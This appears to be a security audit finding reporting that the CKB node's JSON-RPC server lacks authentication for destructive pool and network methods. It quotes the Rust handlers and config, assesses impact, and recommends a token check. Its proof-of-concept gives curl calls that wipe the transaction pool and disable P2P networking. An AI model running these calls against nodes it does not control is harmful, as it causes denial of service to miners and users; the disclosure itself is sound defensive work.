### Title
Missing Authentication on Destructive RPC Methods Allows Any Caller to Wipe the Transaction Pool or Disable P2P Networking — (`rpc/src/module/pool.rs`, `rpc/src/module/net.rs`)

---

### Summary

The CKB JSON-RPC server implements no authentication or authorization mechanism. Destructive state-mutating methods — `clear_tx_pool()`, `remove_transaction()`, and `set_network_active()` — are exposed in the default production module list (`Pool` and `Net`) and accept calls from any RPC caller without any credential, token, or identity check. Any process with access to the RPC port can silently wipe the entire transaction pool, evict individual transactions, or completely disable P2P networking.

---

### Finding Description

The CKB RPC server is built with no authentication layer. Every method registered in the `Pool` and `Net` modules is callable by any HTTP client that can reach the listening socket.

**`clear_tx_pool()`** — `rpc/src/module/pool.rs` lines 684–692:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

No caller identity is checked. The method immediately forwards to `TxPoolController::clear_pool`, which acquires a write lock and calls `tx_pool.clear(...)`, discarding every pending and proposed transaction. [1](#0-0) 

**`remove_transaction(tx_hash)`** — same file, lines 662–669:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
```

Any caller can evict any specific transaction by hash. [2](#0-1) 

**`set_network_active(state: bool)`** — `rpc/src/module/net.rs` lines 772–775:

```rust
fn set_network_active(&self, state: bool) -> Result<()> {
    self.network_controller.set_active(state);
    Ok(())
}
```

Passing `false` immediately halts all P2P message processing — the node stops relaying, syncing, and receiving blocks or transactions. [3](#0-2) 

Both `Pool` and `Net` are in the default production module list:

```toml
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
``` [4](#0-3) 

The RPC service builder registers these handlers with no middleware for authentication. The only protection is the default bind address (`127.0.0.1:8114`), which is a network-level restriction, not an application-level authorization check. [5](#0-4) 

The `clear_pool` call path goes directly from the RPC handler through `TxPoolController::clear_pool` to `TxPool::clear`, which drops all entries: [6](#0-5) 

---

### Impact Explanation

**`clear_tx_pool()`**: Every pending and proposed transaction is permanently evicted from the pool. Miners lose all queued fee revenue. Users whose transactions were in the pool must rebroadcast them. A sustained attacker calling this in a loop keeps the pool perpetually empty, preventing any transaction from being mined and constituting a complete denial-of-service against the tx-pool subsystem.

**`remove_transaction(tx_hash)`**: An attacker who observes a high-value transaction in the pool (via `get_raw_tx_pool`, which is also unauthenticated) can selectively evict it before it is mined, forcing the sender to rebroadcast and potentially manipulating block composition.

**`set_network_active(false)`**: The node is instantly isolated from the P2P network. It stops receiving new blocks and transactions, falls behind the chain tip, and cannot relay anything. A miner node subjected to this attack loses block rewards for the duration of the outage.

---

### Likelihood Explanation

The scope explicitly includes "RPC caller" and "supported local CLI/RPC user" as valid attacker profiles. Two realistic paths exist:

1. **Local process**: Any unprivileged process running on the same host as the CKB node (a malicious dependency, a compromised co-located service, a script injected via another vulnerability) can call `http://127.0.0.1:8114` with no credentials.

2. **Remote caller on exposed deployments**: Exposing the RPC to a non-loopback address is a documented, supported configuration (the `listen_address` field accepts any bind address). The documentation warns against it but does not prevent it and provides no authentication option to make it safe. Any remote attacker who reaches the port can invoke all three methods.

Neither path requires a privileged key, leaked secret, or social engineering.

---

### Recommendation

Add an authentication layer to the RPC server — for example, a bearer token or HTTP Basic Auth secret configured in `ckb.toml` and checked in middleware before any handler is dispatched. At minimum, destructive mutating methods (`clear_tx_pool`, `remove_transaction`, `set_network_active`, `clear_tx_verify_queue`) should require an operator-configured secret that is absent from read-only query methods.

```toml
[rpc]
# Shared secret required for state-mutating RPC calls
# admin_token = "your-secret-token"
```

On the handler side, a middleware guard should reject any mutating call that does not present the correct token in the `Authorization` header.

---

### Proof of Concept

With a default CKB node running (RPC on `127.0.0.1:8114`, `Pool` module enabled):

```bash
# Step 1: Confirm transactions are pending
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"tx_pool_info","params":[]}'
# Returns: {"pending": "0x5", ...}

# Step 2: Wipe the pool — no credentials required
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# Returns: {"result": null}

# Step 3: Pool is now empty
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"tx_pool_info","params":[]}'
# Returns: {"pending": "0x0", ...}

# Step 4: Disable P2P networking — no credentials required
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":4,"jsonrpc":"2.0","method":"set_network_active","params":[false]}'
# Returns: {"result": null}
# Node is now isolated from the P2P network.
```

### Citations

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/module/net.rs (L772-775)
```rust
    fn set_network_active(&self, state: bool) -> Result<()> {
        self.network_controller.set_active(state);
        Ok(())
    }
```

**File:** resource/ckb.toml (L177-183)
```text
[rpc]
# By default RPC only binds to localhost, thus it only allows accessing from the same machine.
#
# Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged.
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
```

**File:** resource/ckb.toml (L190-190)
```text
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
```

**File:** tx-pool/src/process.rs (L916-930)
```rust
    pub(crate) async fn clear_pool(&mut self, new_snapshot: Arc<Snapshot>) {
        {
            let mut tx_pool = self.tx_pool.write().await;
            tx_pool.clear(Arc::clone(&new_snapshot));
        }
        // reset block_assembler
        if self
            .block_assembler_sender
            .send(BlockAssemblerMessage::Reset(new_snapshot))
            .await
            .is_err()
        {
            error!("block_assembler receiver dropped");
        }
    }
```
